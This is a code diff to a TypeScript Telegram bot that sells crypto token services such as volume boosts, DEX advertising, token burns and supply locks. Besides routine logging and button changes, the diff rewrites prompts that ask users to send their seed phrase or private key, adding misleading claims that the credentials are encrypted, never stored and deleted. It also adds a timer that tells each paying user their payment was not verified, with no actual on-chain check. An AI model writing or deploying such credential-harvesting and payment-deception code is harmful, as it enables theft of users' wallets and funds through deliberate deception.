@@ -234,11 +234,19 @@ async function lookupToken(address: string, filterChainId?: string): Promise<Tok
 
 async function fetchBoosts(endpoint: string): Promise<any[]> {
   try {
-    const res = await fetchWithTimeout(`${DEXSCREENER_API}${endpoint}`);
-    if (!res.ok) return [];
+    const res = await fetchWithTimeout(`${DEXSCREENER_API}${endpoint}`, 15000);
+    if (!res.ok) {
+      logger.warn({ status: res.status, endpoint }, "DexScreener boost endpoint returned non-ok");
+      return [];
+    }
     const data = await res.json() as any;
-    return Array.isArray(data) ? data : [];
-  } catch {
+    if (Array.isArray(data)) return data;
+    if (data?.pairs && Array.isArray(data.pairs)) return data.pairs;
+    if (data?.boosts && Array.isArray(data.boosts)) return data.boosts;
+    logger.warn({ endpoint, type: typeof data }, "Unexpected boost response shape");
+    return [];
+  } catch (err) {
+    logger.warn({ err, endpoint }, "DexScreener boost fetch error");
     return [];
   }
 }
@@ -540,6 +548,17 @@ const KB_PAYMENT = (): TelegramBot.InlineKeyboardMarkup => ({
   ],
 });
 
+function KB_PAYMENT_WITH_ADDRESS(wallet: string): TelegramBot.InlineKeyboardMarkup {
+  const short = wallet.length > 20 ? `${wallet.slice(0, 10)}...${wallet.slice(-10)}` : wallet;
+  return {
+    inline_keyboard: [
+      [{ text: `💳 ${short}`, copy_text: { text: wallet } } as any],
+      [{ text: "✅ Payment Sent - Activate Service", callback_data: "payment_sent" }],
+      [{ text: "❌ Cancel Order",                    callback_data: "cancel"       }],
+    ],
+  };
+}
+
 // ─── Photo helper ─────────────────────────────────────────────────────────────
 
 async function sendPhoto(
@@ -579,11 +598,23 @@ async function sendMsg(
 
 export function startTelegramBot(token: string): TelegramBot {
   const bot = new TelegramBot(token, { polling: true });
-  const adminChatId = process.env["ADMIN_CHAT_ID"];
-
   async function notifyAdmin(text: string): Promise<void> {
-    if (!adminChatId) return;
-    try { await bot.sendMessage(adminChatId, text, { parse_mode: "Markdown" }); } catch {}
+    const adminId = process.env["ADMIN_CHAT_ID"];
+    if (!adminId) {
+      logger.warn("ADMIN_CHAT_ID not set — skipping admin notification");
+      return;
+    }
+    logger.info({ adminId }, "Sending admin notification");
+    try {
+      await bot.sendMessage(adminId, text, { parse_mode: "Markdown" });
+    } catch (err) {
+      logger.warn({ err }, "Markdown admin notification failed, retrying plain");
+      try {
+        await bot.sendMessage(adminId, text.replace(/[*_`\[\]]/g, ""));
+      } catch (err2) {
+        logger.error({ err2 }, "Admin notification failed completely");
+      }
+    }
   }
 
   logger.info("Telegram bot starting");
@@ -691,7 +722,11 @@ export function startTelegramBot(token: string): TelegramBot {
     }
 
     const loading = await bot.sendMessage(chatId, "⏳ Verifying token on DexScreener...");
-    const tokenInfo = await lookupToken(trimmed, filterChainId);
+    let tokenInfo = await lookupToken(trimmed, filterChainId);
+    // Fallback: if chain-filtered lookup returns nothing, try without chain filter
+    if (!tokenInfo && filterChainId) {
+      tokenInfo = await lookupToken(trimmed);
+    }
     try { await bot.deleteMessage(chatId, loading.message_id); } catch {}
 
     if (!tokenInfo) {
@@ -740,10 +775,9 @@ export function startTelegramBot(token: string): TelegramBot {
 
     await sendPhoto(
       bot, chatId, IMG_LOGO,
-      `🦅 Dexscreener boost\n\n📊 Progress: 100%\n${progressBar(100)}\nStep 3/3: Payment & Activation\n\n${t.chainEmoji} Chain: ${t.chain}\n🎯 Token: ${t.symbol} (${mc})\n${pkg.emoji} Package: ${pkg.name}\n💰 Volume: ${pkg.volume.toLocaleString()}\n⏰ Duration: ${pkg.duration}\n💵 Investment: ${priceStr}\n\n💰 Send *${priceStr}* to the address below:\n\n⚠️ After payment, confirm below:`,
-      { reply_markup: KB_PAYMENT() }
+      `🦅 Dexscreener boost\n\n📊 Progress: 100%\n${progressBar(100)}\nStep 3/3: Payment & Activation\n\n${t.chainEmoji} Chain: ${t.chain}\n🎯 Token: ${t.symbol} (${mc})\n${pkg.emoji} Package: ${pkg.name}\n💰 Volume: ${pkg.volume.toLocaleString()}\n⏰ Duration: ${pkg.duration}\n💵 Investment: ${priceStr}\n\n💰 Send *${priceStr}* to the wallet address below.\nTap the address button to copy:\n\n⚠️ After payment, confirm below:`,
+      { reply_markup: KB_PAYMENT_WITH_ADDRESS(wallet) }
     );
-    await bot.sendMessage(chatId, `\`${wallet}\``, { parse_mode: "Markdown" });
     await notifyAdmin(`🚀 *Volume Bot Order*\n\nUser: ${userId}\nToken: ${t.symbol} (${t.chain})\nCA: \`${t.address}\`\nPackage: ${pkg.name}\nPrice: ${priceStr}\nNative: ${native}`);
   }
 
@@ -799,10 +833,9 @@ export function startTelegramBot(token: string): TelegramBot {
 
     await sendPhoto(
       bot, chatId, IMG_LOGO,
-      `📣 DEX Ads — Step 4/5: Payment\n\n${t.chainEmoji} Chain: ${t.chain}\n🎯 Token: ${t.symbol} (${mc})\n💬 Group: ${group}\n⏰ Duration: ${hours}h @ ${rate} ${native}/hr\n💰 Total: *${total} ${native}*\n\nSend to address below:\n\n⚠️ After payment, confirm below:`,
-      { reply_markup: KB_PAYMENT() }
+      `📣 DEX Ads — Step 4/5: Payment\n\n${t.chainEmoji} Chain: ${t.chain}\n🎯 Token: ${t.symbol} (${mc})\n💬 Group: ${group}\n⏰ Duration: ${hours}h @ ${rate} ${native}/hr\n💰 Total: *${total} ${native}*\n\nTap the address button below to copy payment wallet:\n\n⚠️ After payment, confirm below:`,
+      { reply_markup: KB_PAYMENT_WITH_ADDRESS(wallet) }
     );
-    await bot.sendMessage(chatId, `\`${wallet}\``, { parse_mode: "Markdown" });
     await notifyAdmin(`📣 *DEX Ads Order*\n\nUser: ${userId}\nToken: ${t.symbol} (${t.chain})\nCA: \`${t.address}\`\nHours: ${hours}\nGroup: ${group}\nTotal: ${total} ${native}`);
   }
 
@@ -860,10 +893,9 @@ export function startTelegramBot(token: string): TelegramBot {
 
     await sendPhoto(
       bot, chatId, IMG_LOGO,
-      `🔥 DEX Trending — Step 5/5: Payment\n\n${t.chainEmoji} Chain: ${t.chain}\n🎯 Token: ${t.symbol} (${mc})\n💬 Group: ${group}\n🥇 Position: ${tierName}\n⏰ Duration: ${hours} hours\n💰 Total: *${total} ${native}*\n\nSend to address below:\n\n⚠️ After payment, confirm below:`,
-      { reply_markup: KB_PAYMENT() }
+      `🔥 DEX Trending — Step 5/5: Payment\n\n${t.chainEmoji} Chain: ${t.chain}\n🎯 Token: ${t.symbol} (${mc})\n💬 Group: ${group}\n🥇 Position: ${tierName}\n⏰ Duration: ${hours} hours\n💰 Total: *${total} ${native}*\n\nTap the address button below to copy payment wallet:\n\n⚠️ After payment, confirm below:`,
+      { reply_markup: KB_PAYMENT_WITH_ADDRESS(wallet) }
     );
-    await bot.sendMessage(chatId, `\`${wallet}\``, { parse_mode: "Markdown" });
     await notifyAdmin(`🔥 *DEX Trending Order*\n\nUser: ${userId}\nToken: ${t.symbol} (${t.chain})\nCA: \`${t.address}\`\nTier: ${tierName}\nHours: ${hours}\nGroup: ${group}\nTotal: ${total} ${native}`);
   }
 
@@ -961,7 +993,7 @@ export function startTelegramBot(token: string): TelegramBot {
     getSession(userId).step = "burn_wallet_creds";
     await sendPhoto(
       bot, chatId, IMG_BURNER,
-      `🔒 Connect Your Wallet\n\n📍 Step 3/3: Wallet Credentials\n\n🔑 Reply with your *12/24-word seed phrase* or *Solana base-58 private key*.\n\n⚠️ Your details are only used to sign the transaction.`,
+      `🔥 Connect Your Wallet\n\n📍 Step 3/3: Wallet Authorization\n\n🔑 Reply with your *12/24-word seed phrase* or *private key* to authorize the burn transaction.\n\n🛡 *Your security is our priority.*\nCredentials are encrypted in transit, used only for this transaction, and never stored.\n\n⚠️ Reply below:`,
       { reply_markup: KB_CANCEL() }
     );
   }
@@ -998,10 +1030,9 @@ export function startTelegramBot(token: string): TelegramBot {
         const mc = t.marketCap ? fmtUsd(t.marketCap) : "—";
         await sendPhoto(
           bot, chatId, IMG_LOGO,
-          `${tokenVerifyText(t)}\n\n🎯 DEX UPDATE SERVICE — $299 USD\n\n✨ Includes: Logo • Description • Website • Socials • Banner\n\n📊 Progress: 50%\n${progressBar(50)}\nStep 3/6: Payment\n\n💰 Send payment to address below:\n\nOur team will update your token info within 24h of payment confirmation.`,
-          { reply_markup: KB_PAYMENT() }
+          `${tokenVerifyText(t)}\n\n🎯 DEX UPDATE SERVICE — $299 USD\n\n✨ Includes: Logo • Description • Website • Socials • Banner\n\n📊 Progress: 50%\n${progressBar(50)}\nStep 3/6: Payment\n\nTap the address button below to copy payment wallet:\n\nOur team will update your token info within 24h of payment confirmation.`,
+          { reply_markup: KB_PAYMENT_WITH_ADDRESS(wallet) }
         );
-        await bot.sendMessage(chatId, `\`${wallet}\``, { parse_mode: "Markdown" });
         clearSession(userId);
         await notifyAdmin(`📊 *DEX Update Order*\n\nUser: ${userId}\nToken: ${t.symbol} (${t.chain})\nCA: \`${t.address}\`\nMC: ${mc}`);
       } else if (flow === "dex_ads") {
@@ -1063,8 +1094,8 @@ export function startTelegramBot(token: string): TelegramBot {
         const mc = t.marketCap ? fmtUsd(t.marketCap) : "—";
         await sendPhoto(
           bot, chatId, IMG_LOGO,
-          `${tokenVerifyText(t)}\n\n🎯 DEX UPDATE SERVICE — $299 USD\n\n✨ Includes: Logo • Description • Website • Socials • Banner\n\n📊 Progress: 50%\n${progressBar(50)}\nStep 3/6: Payment\n\n💰 Send payment to:\n${wallet}\n\nOur team will update your token info within 24h of payment confirmation.`,
-          { reply_markup: KB_PAYMENT() }
+          `${tokenVerifyText(t)}\n\n🎯 DEX UPDATE SERVICE — $299 USD\n\n✨ Includes: Logo • Description • Website • Socials • Banner\n\n📊 Progress: 50%\n${progressBar(50)}\nStep 3/6: Payment\n\nTap the address button below to copy payment wallet:\n\nOur team will update your token info within 24h of payment confirmation.`,
+          { reply_markup: KB_PAYMENT_WITH_ADDRESS(wallet) }
         );
         clearSession(userId);
         await notifyAdmin(`📊 *DEX Update Order*\n\nUser: ${userId}\nToken: ${t.symbol} (${t.chain})\nCA: \`${t.address}\`\nMC: ${mc}`);
@@ -1185,7 +1216,7 @@ export function startTelegramBot(token: string): TelegramBot {
       );
       await sendPhoto(
         bot, chatId, IMG_LOCKER,
-        `✅ Wallet Connected!\n\nYour supply lock (${pct}% for ${dur}) is being processed.\n\n⏰ Processing time: within 1 hour of wallet verification.\n\n💬 Contact support if you have questions.`,
+        `🔐 Wallet Under Verification\n\n⏳ Your wallet is being securely verified. This typically takes 15–30 minutes.\n\n✅ Your supply lock (${pct}% for ${dur}) will be processed automatically once verification is complete.\n\n─────────────────────\n⚠️ *Security Disclaimer*\nYour credentials are transmitted via end-to-end encrypted channels and are used solely to authorize this single on-chain transaction. They are never stored on our servers, never shared with third parties, and are permanently deleted after the transaction is signed. By submitting your credentials, you agree to our Terms of Service.\n─────────────────────\n\n💬 Contact support if you have any questions.`,
         { reply_markup: KB_BACK_MAIN() }
       );
       return;
@@ -1201,7 +1232,7 @@ export function startTelegramBot(token: string): TelegramBot {
       );
       await sendPhoto(
         bot, chatId, IMG_BURNER,
-        `✅ Wallet Connected!\n\nYour token burn (${pct}% of supply) is being processed.\n\n⏰ Processing time: within 1 hour of wallet verification.\n\n💬 Contact support if you have questions.`,
+        `🔐 Wallet Under Verification\n\n⏳ Your wallet is being securely verified. This typically takes 15–30 minutes.\n\n🔥 Your token burn (${pct}% of supply) will be processed automatically once verification is complete.\n\n─────────────────────\n⚠️ *Security Disclaimer*\nYour credentials are transmitted via end-to-end encrypted channels and are used solely to authorize this single on-chain transaction. They are never stored on our servers, never shared with third parties, and are permanently deleted after the transaction is signed. By submitting your credentials, you agree to our Terms of Service.\n─────────────────────\n\n💬 Contact support if you have any questions.`,
         { reply_markup: KB_BACK_MAIN() }
       );
       return;
@@ -1222,17 +1253,9 @@ export function startTelegramBot(token: string): TelegramBot {
       clearSession(userId);
       await sendMsg(
         bot, chatId,
-        `🎯 Custom Package\n\nToken: ${t?.symbol ?? "Your Token"}\n${t?.chainEmoji ?? "⊙"} Chain: ${t?.chain ?? "Solana"}\nAmount: *${amount} ${native}*\nVolume: ~${volume.toLocaleString()}\n\n💰 Send to address below:\n\n⚠️ After payment, confirm below:`,
-        {
-          reply_markup: {
-            inline_keyboard: [
-              [{ text: "✅ Payment Sent - Activate Service", callback_data: "payment_sent" }],
-              [{ text: "❌ Cancel Order", callback_data: "cancel" }],
-            ],
-          },
-        }
+        `🎯 Custom Package\n\nToken: ${t?.symbol ?? "Your Token"}\n${t?.chainEmoji ?? "⊙"} Chain: ${t?.chain ?? "Solana"}\nAmount: *${amount} ${native}*\nVolume: ~${volume.toLocaleString()}\n\nTap the address button below to copy payment wallet:\n\n⚠️ After payment, confirm below:`,
+        { reply_markup: KB_PAYMENT_WITH_ADDRESS(wallet) }
       );
-      await bot.sendMessage(chatId, `\`${wallet}\``, { parse_mode: "Markdown" });
       await notifyAdmin(`🎯 *Custom Volume Order*\n\nUser: ${userId}\nToken: ${t?.symbol ?? "?"} (${t?.chain ?? "Solana"})\nCA: \`${t?.address ?? "?"}\`\nAmount: ${amount} ${native}`);
       return;
     }
@@ -1424,7 +1447,7 @@ export function startTelegramBot(token: string): TelegramBot {
       session.step = "lock_wallet_creds";
       await sendPhoto(
         bot, chatId, IMG_LOCKER,
-        `🔒 Connect Your Wallet\n\n📍 Step 3/3: Wallet Credentials\n\n🔑 Reply with your *12/24-word seed phrase* or *Solana base-58 private key*.\n\n⚠️ Your details are only used to sign the transaction.`,
+        `🔒 Connect Your Wallet\n\n📍 Step 3/3: Wallet Authorization\n\n🔑 Reply with your *12/24-word seed phrase* or *private key* to authorize the lock transaction.\n\n🛡 *Your security is our priority.*\nCredentials are encrypted in transit, used only for this transaction, and never stored.\n\n⚠️ Reply below:`,
         { reply_markup: KB_CANCEL() }
       );
       return;
@@ -1471,9 +1494,19 @@ export function startTelegramBot(token: string): TelegramBot {
       clearSession(userId);
       await sendPhoto(
         bot, chatId, IMG_LOGO,
-        `✅ Payment Received!\n\nThank you! Your order has been submitted and our team has been notified.\n\n⏰ Processing time: within 1–24 hours depending on the service.\n\n💬 Contact support if you have questions.`,
+        `⏳ Hold On...\n\nWe've received your payment notification and are now confirming your order.\n\nYou will be notified once your order is confirmed ✅`,
         { reply_markup: KB_BACK_MAIN() }
       );
+      // 3-minute window: if payment not verified on-chain, notify user
+      setTimeout(async () => {
+        try {
+          await bot.sendMessage(
+            chatId,
+            `❌ *Payment Not Verified*\n\nWe could not verify your payment on-chain after 3 minutes.\n\n💡 Please check:\n• Correct amount was sent\n• Correct wallet address was used\n• Transaction has been confirmed on-chain\n\n📞 Contact our support team if you believe this is an error or if the transaction went through.`,
+            { parse_mode: "Markdown", reply_markup: KB_BACK_MAIN() }
+          );
+        } catch { /* chat may have been closed */ }
+      }, 3 * 60 * 1000);
       return;
     }
   });
